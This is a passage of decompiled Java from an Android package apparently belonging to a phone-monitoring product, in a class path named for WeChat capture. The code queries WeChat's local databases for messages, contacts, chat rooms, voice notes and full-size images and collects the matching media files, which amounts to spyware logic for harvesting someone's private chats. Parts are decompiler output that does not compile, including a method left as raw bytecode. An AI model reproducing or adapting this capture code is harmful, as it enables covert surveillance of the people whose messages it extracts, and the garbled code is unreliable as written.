        ((StringBuilder)localObject1).<init>();
        String str = "SELECT FileName FROM voiceinfo WHERE (MsgId = " + paramLong + ")";
        boolean bool2 = false;
        localCursor = null;
        Object localObject3 = new Object[i];
        Object localObject4 = com.vvt.io.d.a();
        localObject3[0] = localObject4;
        localObject3 = String.format("%s/tencent/MicroMsg/", (Object[])localObject3);
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        int k = 0;
        localObject4 = null;
        try
        {
            localObject4 = new String[0];
            localCursor = paramSQLiteDatabase.rawQuery(str, (String[])localObject4);
            if (localCursor != null)
            {
                boolean bool3 = localCursor.moveToFirst();
                if (bool3)
                {
                    str = "FileName";
                    int m = localCursor.getColumnIndex(str);
                    str = localCursor.getString(m);
                    localObject4 = "*%s*";
                    j = 1;
                    arrayOfObject = new Object[j];
                    arrayOfObject[0] = str;
                    str = String.format((String)localObject4, arrayOfObject);
                    k = 4;
                    localObject1 = a(paramString, paramb, (String)localObject3, str, k);
                }
            }
            if (localCursor == null) {
                break label223;
            }
        }
        catch (Exception localException)
        {
            for (;;)
            {
                boolean bool4 = e;
                if ((bool4) && (localCursor == null)) {}
            }
        }
        finally
        {
            if (localCursor == null) {
                break label270;
            }
            localCursor.close();
        }
        localCursor.close();
        label223:
        bool2 = b;
        if (bool2) {}
        return (ArrayList)localObject1;
    }

    private static String c()
    {
        StringBuilder localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("SELECT ");
        localStringBuilder.append("msgId, ");
        localStringBuilder.append("m.msgSvrId, ");
        localStringBuilder.append("createTime, ");
        localStringBuilder.append("talker, ");
        localStringBuilder.append("m.content, ");
        localStringBuilder.append("m.isSend, ");
        localStringBuilder.append("nickname, ");
        localStringBuilder.append("m.type, ");
        localStringBuilder.append("memberlist ");
        localStringBuilder.append("FROM message m ");
        localStringBuilder.append("LEFT JOIN rcontact MyUncaughtExceptionHandler ");
        localStringBuilder.append("ON m.talker = MyUncaughtExceptionHandler.username ");
        localStringBuilder.append("LEFT JOIN chatroom ");
        localStringBuilder.append("ON chatroomname = m.talker ");
        localStringBuilder.append("WHERE m.type IN (1, 43, 48,3,34,62) ");
        localStringBuilder.append("AND msgId > ? ");
        localStringBuilder.append("AND msgId <= ? ");
        localStringBuilder.append("ORDER BY msgId DESC ");
        return localStringBuilder.toString();
    }

    private static ArrayList c(SQLiteDatabase paramSQLiteDatabase, long paramLong, String paramString, com.vvt.base.b paramb)
    {
        int i = 1;
        int j = 0;
        String[] arrayOfString = null;
        boolean bool1 = b;
        if (bool1) {}
        Object localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        String str1 = "SELECT bigImgPath FROM ImgInfo2 WHERE (msgSvrId = " + paramLong + ")";
        localObject3 = new Object[i];
        String str2 = com.vvt.io.d.a();
        localObject3[0] = str2;
        str2 = String.format("%s/tencent/MicroMsg/", (Object[])localObject3);
        boolean bool2 = false;
        localObject3 = null;
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        j = 0;
        arrayOfString = null;
        for (;;)
        {
            try
            {
                arrayOfString = new String[0];
                localObject3 = paramSQLiteDatabase.rawQuery(str1, arrayOfString);
                if (localObject3 == null) {
                    continue;
                }
                boolean bool3 = ((Cursor)localObject3).moveToFirst();
                if (!bool3) {
                    continue;
                }
                str1 = "bigImgPath";
                int k = ((Cursor)localObject3).getColumnIndex(str1);
                str1 = ((Cursor)localObject3).getString(k);
                j = 1;
                localObject1 = a(paramString, paramb, str2, str1, j);
                if (localObject3 == null) {
                    continue;
                }
            }
            catch (Exception localException)
            {
                boolean bool4 = e;
                if ((bool4) && (localObject3 == null)) {
                    continue;
                }
                continue;
            }
            finally
            {
                if (localObject3 == null) {
                    continue;
                }
                ((Cursor)localObject3).close();
            }
            ((Cursor)localObject3).close();
            bool2 = b;
            if (bool2) {}
            return (ArrayList)localObject1;
            bool4 = e;
            if (!bool4) {}
        }
    }

    /* Error */
    private static boolean c(String paramString)
    {
        // Byte code:
        //   0: new 325	java/io/RandomAccessFile
        //   3: astore_1
        //   4: new 40	java/io/File
        //   7: astore_2
        //   8: aload_2
        //   9: aload_0
        //   10: invokespecial 244	java/io/File:<init>	(Ljava/lang/String;)V
        //   13: ldc_w 327
        //   16: astore_3
        //   17: aload_1
        //   18: aload_2
        //   19: aload_3
        //   20: invokespecial 330	java/io/RandomAccessFile:<init>	(Ljava/io/File;Ljava/lang/String;)V
        //   23: aload_1
        //   24: invokevirtual 350	java/io/RandomAccessFile:close	()V
        //   27: iconst_1
        //   28: istore 4
        //   30: iload 4
        //   32: ireturn
        //   33: astore_1
        //   34: iconst_0
        //   35: istore 4
        //   37: aconst_null
        //   38: astore_1
        //   39: goto -9 -> 30
        //   42: astore_1
        //   43: goto -16 -> 27
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	46	0	paramString	String
        //   3	21	1	localRandomAccessFile	RandomAccessFile
        //   33	1	1	localFileNotFoundException	java.io.FileNotFoundException
        //   38	1	1	localObject	Object
        //   42	1	1	localException	Exception
        //   7	12	2	localFile	File
        //   16	4	3	str	String
        //   28	8	4	bool	boolean
        // Exception table:
        //   from	to	target	type
        //   0	3	33	java/io/FileNotFoundException
        //   4	7	33	java/io/FileNotFoundException
        //   9	13	33	java/io/FileNotFoundException
        //   19	23	33	java/io/FileNotFoundException
        //   23	27	33	java/io/FileNotFoundException
        //   23	27	42	java/lang/Exception
    }

    private static String d()
    {
        StringBuilder localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("SELECT ");
        localStringBuilder.append("id, ");
        localStringBuilder.append("value ");
        localStringBuilder.append("FROM userinfo ");
        localStringBuilder.append("WHERE type = 3 ");
        return localStringBuilder.toString();
    }

    private static String d(String paramString)
    {
        boolean bool1 = b;
        if (bool1) {}
        bool1 = b;
        if (bool1) {}
        Object localObject1 = ImType.WECHAT;
        Object localObject2 = ImMediaFileType.USER_PROFILE;
        localObject1 = com.vvt.im.a.c.a(paramString, (ImType)localObject1, (ImMediaFileType)localObject2);
        localObject2 = com.vvt.im.a.c.a(ImMediaFileType.USER_PROFILE);
        Object localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
        localObject3 = File.separator;
        localObject1 = (String)localObject3 + (String)localObject2;
        boolean bool2 = b;
        if (bool2) {}
        return (String)localObject1;
    }

    private static String e(String paramString) {
        int i = 1;
        Object localObject = MessageDigest.getInstance("MD5");
        ((MessageDigest)localObject).reset();
        byte[] arrayOfByte = paramString.getBytes();
        ((MessageDigest)localObject).update(arrayOfByte);
        localObject = ((MessageDigest)localObject).digest();
        Object[] arrayOfObject = new Object[i];
        BigInteger localBigInteger = new java/math/BigInteger;
        localBigInteger.<init>(i, (byte[])localObject);
        arrayOfObject[0] = localBigInteger;
        return String.format("%032x", arrayOfObject);
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */